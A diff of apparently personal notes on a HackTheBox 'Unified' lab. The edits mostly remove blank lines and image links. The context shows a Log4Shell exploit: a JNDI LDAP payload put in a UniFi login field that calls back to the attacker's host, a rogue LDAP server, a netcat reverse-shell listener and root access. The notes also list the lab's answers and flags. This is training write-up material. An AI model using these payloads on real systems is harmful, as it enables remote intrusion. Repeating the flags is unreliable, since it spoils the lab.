@@ -612,8 +612,6 @@ Te: trailers
 
 Connection: close
 
-
-
 {"username":"test","password":"test","remember":false,"strict":true}
 
 We input the payload into the remember field as shown above so that we can identify an injection point if
@@ -659,16 +657,11 @@ Te: trailers
 
 Connection: close
 
-
-
 {"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.113/whatever}","strict":true}
-
-
 
 After we hit "send" the "Response" pane will display the response from the request. The output shows us an
 error message stating that the payload is invalid, but despite the error message the payload is actually being
 executed.
-
 
 HTTP/1.1 400 
 
@@ -689,8 +682,6 @@ Content-Length: 64
 Date: Tue, 08 Nov 2022 15:36:34 GMT
 
 Connection: close
-
-
 
 {"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
 
@@ -722,13 +713,11 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 10:40:08.816187 IP 10.129.72.184.33912 > 10.10.14.113.ldap: Flags [S], seq 1556730060, win 64240, options [mss 1337,sackOK,TS val 240529267 ecr 0,nop,wscale 7], length 0
 10:40:08.822294 IP 10.10.14.113.ldap > 10.129.72.184.33912: Flags [R.], seq 0, ack 1556730061, win 0, length 0
 
-
 The tcpdump output shows a connection being received on our machine. This proves that the application is
 indeed vulnerable since it is trying to connect back to us on the LDAP port 389
 
 We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to
 the server and will give us Remote Code Execution on the vulnerable system.
-
 
 ┌──(kali㉿kali)-[~/hackthebox]
 └─$ sudo apt install openjdk-11-jdk -y 
@@ -738,7 +727,6 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 openjdk version "11.0.16" 2022-07-19
 OpenJDK Runtime Environment (build 11.0.16+8-post-Debian-1)
 OpenJDK 64-Bit Server VM (build 11.0.16+8-post-Debian-1, mixed mode, sharing)
-
 
 Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is
 an Integrated Development Environment (IDE) that can be used to create a structured project and compile
@@ -1590,7 +1578,6 @@ Mapping ldap://10.10.14.113:1389/o=reference to artsploit.controllers.RemoteRefe
 Mapping ldap://10.10.14.113:1389/o=websphere2 to artsploit.controllers.WebSphere2
 Mapping ldap://10.10.14.113:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
 
-
 Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to
 capture the reverse shell.
 
@@ -1605,7 +1592,6 @@ ${jndi:ldap://10.10.14.113:1389/o=tomcat} and click Send .
 
 After sending the request, a connection to our rogue server is received and the following message is shown.
 Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
-
 
 doing with another port 1337
 
@@ -1654,8 +1640,6 @@ Content-Length: 108
 Te: trailers
 
 Connection: close
-
-
 
 {"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.113:1389/o=tomcat}","strict":true}
 
@@ -2365,7 +2349,6 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
 
-
 root@unified:~# find / -type f -name root.txt 2>/dev/null
 /root/root.txt
 root@unified:~# cat /root/root.txt
@@ -2468,14 +2451,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 I learnt alot log4j in Unifi Network and also attacking mongodb
 
 ```
-![[Pasted image 20221108090724.png]]
-![[Pasted image 20221108103957.png]]
-
-![[Pasted image 20221108111355.png]]
-
-![[Pasted image 20221108112412.png]]
-
-![[Pasted image 20221108112810.png]]
 
 Which are the first four open ports? 
 In ascending order and without spaces
@@ -2513,7 +2488,5 @@ Submit user flag
 *6ced1a6a89e666c0620cdb10262ba127*
 Submit root flag 
 *e50bc93c75b634e4b272d2f771c33681*
-
-
 
 [[Vaccine]]
